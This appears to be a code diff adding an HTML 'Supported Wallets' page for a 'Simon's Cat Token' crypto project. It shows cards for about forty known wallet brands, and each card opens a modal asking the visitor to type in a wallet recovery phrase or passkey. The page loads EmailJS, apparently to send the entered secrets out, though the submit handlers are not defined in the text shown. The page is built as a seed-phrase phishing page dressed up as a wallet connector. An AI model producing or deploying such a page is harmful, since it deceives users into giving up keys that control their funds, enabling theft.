@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supported Wallets - Simon's Cat Token</title>
+    <style>
+        /* Global Styles (Copied from main page) */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: white; /* Ensures text is white by default */
+        }
+
+        body {
+            background-color: #020b1e;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image:
+                radial-gradient(white, rgba(255, 255, 255, .2) 2px, transparent 2px),
+                radial-gradient(white, rgba(255, 255, 255, .15) 1px, transparent 1px);
+            background-size: 100px 100px, 60px 60px;
+            background-position: 0 0, 30px 30px;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        /* Header Styles (Copied from main page) */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            z-index: 2; /* Ensure header is above background */
+            position: relative;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+        }
+
+        .logo img {
+            width: 100px;
+            height: auto;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .social-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .buy-button {
+            background-color: white;
+            color: black;
+            border: none;
+            border-radius: 50px;
+            padding: 12px 24px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        /* Planet Styles (Copied from main page) */
+        .planet {
+            position: absolute;
+            border-radius: 50%;
+            z-index: 0; /* Ensure planets are behind content */
+        }
+
+        .planet-1 {
+            width: 200px;
+            height: 200px;
+            background: linear-gradient(to right, #143b25, #1a6e3d);
+            left: -50px;
+            top: 50%;
+        }
+
+        .planet-2 {
+            width: 400px;
+            height: 400px;
+            background: linear-gradient(to right, #0b3b4d, #05889e);
+            left: 30%;
+            top: 100px;
+        }
+
+        .planet-3 {
+            width: 150px;
+            height: 150px;
+            background: linear-gradient(to right, #8e7e35, #c4a93b);
+            right: -20px;
+            bottom: 50px;
+        }
+
+        /* Wallet Grid Styles */
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 40px;
+            max-width: 1200px;
+            margin: 50px auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .wallet-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .wallet-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 15px;
+            transition: transform 0.3s ease;
+        }
+
+        .search-container {
+            max-width: 800px;
+            margin: 40px auto 20px;
+            padding: 0 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .search-bar {
+            width: 100%;
+            padding: 15px 25px;
+            border-radius: 50px;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+            backdrop-filter: blur(5px);
+            transition: all 0.3s ease;
+        }
+
+        .search-bar:focus {
+            outline: 2px solid #ff4444;
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 15px rgba(255, 68, 68, 0.3);
+        }
+
+        /* Modal Styles (Copied and Adjusted from main page) */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            width: 90%;
+            max-width: 500px;
+            margin: 10% auto;
+            padding: 30px;
+            position: relative;
+            animation: modalSlide 0.3s ease-out;
+            color: white; /* Ensures text is white inside modal */
+            text-align: center; /* Center aligns the content in the modal */
+        }
+
+        @keyframes modalSlide {
+            from {
+                transform: translateY(-20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Auth Tabs Styles */
+        .auth-tabs {
+            display: flex;
+            gap: 15px;
+            margin: 20px 0;
+            justify-content: center;
+        }
+
+        .auth-tab {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            border-radius: 25px;
+            padding: 12px 25px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .auth-tab.active {
+            background: #ff4444;
+            box-shadow: 0 2px 10px rgba(255, 68, 68, 0.3);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .auth-input {
+            width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            font-family: monospace;
+            resize: none;
+        }
+
+        .security-warning {
+            color: #ff4444;
+            font-size: 12px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .connect-wallet-btn {
+    background-color: #ff4444;
+    color: white;
+    border: none;
+    border-radius: 50px;
+    padding: 14px 30px;
+    font-weight: bold;
+    font-size: 16px;
+    cursor: pointer;
+    margin-bottom: 20px;
+    transition: all 0.3s ease;
+}
+
+.connect-wallet-btn:hover {
+    background-color: #ff2222;
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(255, 68, 68, 0.4);
+}
+
+
+        /* Close Button Style */
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            color: #aaa;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover {
+            color: white;
+        }
+
+        /* Loader Style */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid #ff4444;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .wallet-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+                padding: 20px;
+            }
+            
+            .wallet-icon {
+                width: 60px;
+                height: 60px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Background Planets (Ensure z-index is correct) -->
+        <div class="planet planet-1"></div>
+        <div class="planet planet-2"></div>
+        <div class="planet planet-3"></div>
+
+        <!-- Header Section -->
+        <header>
+            <div class="logo">
+                <img src="/d13fcea5-4453-40ca-a43a-95c1f1c0e7ec_Simons-Cat-Logo-PNG.webp" alt="Simon's Cat Logo"/>
+            </div>
+            <div class="social-links">
+                <div class="social-icon">
+                    <svg viewBox="0 0 24 24" fill="white">
+                        <path d="M21 7.28V5c0-1.1-.9-2-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2h14c1.1 0 2-.9 2-2v-2.28A2 2 0 0022 15V9a2 2 0 00-1-1.72zM20 9v6h-7l-2 2H5V5h14v2h-4.5a.5.5 0 00-.5.5v1a.5.5 0 00.5.5H20z"/>
+                    </svg>
+                </div>
+                <div class="social-icon">
+                    <img src="/x.svg" alt="X"/>
+                </div>
+                <div class="social-icon">
+                    <img src="/telegram.svg" alt="Telegram"/>
+                </div>
+            </div>
+            <button class="buy-button">BUY $CAT</button>
+        </header>
+
+        <!-- Search Section -->
+        <div class="search-container">
+            <input type="text" class="search-bar" placeholder="Search 50+ wallets..." id="walletSearch">
+        </div>
+
+        <!-- Wallet Grid -->
+        <div class="wallet-grid" id="walletGrid">
+            <!-- Wallets generated here -->
+        </div>
+
+        <!-- Authentication Modal -->
+        <div id="authModal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeAuthModal()">&times;</span>
+                <h2 id="authTitle">Wallet Authentication</h2>
+                
+                <div class="auth-tabs">
+                    <button class="auth-tab active" onclick="switchTab('phrase')">Seed Phrase</button>
+                    <button class="auth-tab" onclick="switchTab('passkey')">Passkey</button>
+                </div>
+
+                <div id="phrase" class="tab-content active">
+                    <textarea class="auth-input" placeholder="Enter recovery phrase (12-24 words)" rows="4" spellcheck="false"></textarea>
+                    <p class="security-warning">Never share your recovery phrase with anyone!</p>
+                    <button class="connect-wallet-btn" onclick="handlePhraseAuth()">Verify</button>
+                </div>
+
+                <div id="passkey" class="tab-content">
+                    <input type="password" class="auth-input" placeholder="Enter your passkey">
+                    <p class="security-warning">Ensure you're on the official website before entering credentials</p>
+                    <button class="connect-wallet-btn" onclick="handlePasskeyAuth()">Authenticate</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init('YOUR_PUBLIC_KEY');
+        })();
+
+        const wallets = [
+            { name: 'MetaMask', img: 'exchanges/binance.svg'},
+            { name: 'Trust Wallet', img: 'trustwallet-icon.svg' },
+            { name: 'Coinbase Wallet', img: 'coinbase-icon.svg' },
+            { name: 'Ledger', img: 'ledger-icon.svg' },
+            { name: 'Trezor', img: 'trezor-icon.svg' },
+            { name: 'Exodus', img: 'exodus-icon.svg' },
+            { name: 'Phantom', img: 'phantom-icon.svg' },
+            { name: 'Binance Chain', img: 'binance-icon.svg' },
+            { name: 'OKX Wallet', img: 'okx-icon.svg' },
+            { name: 'Brave Wallet', img: 'brave-icon.svg' },
+            { name: 'MathWallet', img: 'mathwallet-icon.svg' },
+            { name: 'TokenPocket', img: 'tokenpocket-icon.svg' },
+            { name: 'SafePal', img: 'safepal-icon.svg' },
+            { name: 'Argent', img: 'argent-icon.svg' },
+            { name: 'Coin98', img: 'coin98-icon.svg' },
+            { name: 'Huobi Wallet', img: 'huobi-icon.svg' },
+            { name: 'BitKeep', img: 'bitkeep-icon.svg' },
+            { name: 'ZenGo', img: 'zengo-icon.svg' },
+            { name: 'Atomic Wallet', img: 'atomic-icon.svg' },
+            { name: 'MyEtherWallet', img: 'mew-icon.svg' },
+            { name: 'Enjin Wallet', img: 'enjin-icon.svg' },
+            { name: 'Guarda Wallet', img: 'guarda-icon.svg' },
+            { name: 'Edge Wallet', img: 'edge-icon.svg' },
+            { name: 'Coinomi', img: 'coinomi-icon.svg' },
+            { name: 'Ellipal', img: 'ellipal-icon.svg' },
+            { name: 'CoolWallet', img: 'coolwallet-icon.svg' },
+            { name: 'Ngrave', img: 'ngrave-icon.svg' },
+            { name: 'Keystone', img: 'keystone-icon.svg' },
+            { name: 'GridPlus', img: 'gridplus-icon.svg' },
+            { name: 'DCENT', img: 'dcent-icon.svg' },
+            { name: 'SecuX', img: 'secux-icon.svg' },
+            { name: 'Bitski', img: 'bitski-icon.svg' },
+            { name: 'Torus', img: 'torus-icon.svg' },
+            { name: 'Portis', img: 'portis-icon.svg' },
+            { name: 'Fortmatic', img: 'fortmatic-icon.svg' },
+            { name: 'Authereum', img: 'authereum-icon.svg' },
+            { name: 'WalletConnect', img: 'walletconnect-icon.svg' },
+            { name: 'Opera Wallet', img: 'opera-icon.svg' },
+            { name: 'AlphaWallet', img: 'alphawallet-icon.svg' },
+            { name: 'CoinZoom', img: 'coinzoom-icon.svg' }
+        ];
+
+
+        const walletGrid = document.getElementById('walletGrid');
+        wallets.forEach(wallet => {
+            const card = document.createElement('div');
+            card.className = 'wallet-card';
+            card.innerHTML = `
+                <img src="wallets/${wallet.img}" class="wallet-icon" alt="${wallet.name}">
+                <h3>${wallet.name}</h3>
+            `;
+            card.onclick = () => showAuthModal(wallet.name);
+            walletGrid.appendChild(card);
+        });
+
+        function tapWallet(walletName) {
+        // Show authentication modal
+        showAuthModal(walletName);
+    }
+
+         // Modal Functions
+         function showAuthModal(walletName) {
+            document.getElementById('authTitle').textContent = `${walletName} Authentication`;
+            document.getElementById('authModal').style.display = 'block';
+        }
+           // Close modal function
+         function closeAuthModal() {
+            document.getElementById('authModal').style.display = 'none';
+        }
+
+        function switchTab(tabId) {
+        const tabContents = document.querySelectorAll('.tab-content');
+        const tabLinks = document.querySelectorAll('.auth-tab');
+
+        tabContents.forEach(content => content.classList.remove('active'));
+        tabLinks.forEach(link => link.classList.remove('active'));
+
+        document.getElementById(tabId).classList.add('active');
+         const tabName = document.querySelector(`[onclick="switchTab('${tabId}')"]`);
+        tabName.classList.add('active');
+    }
+
+    </script>
+</body>
+</html>
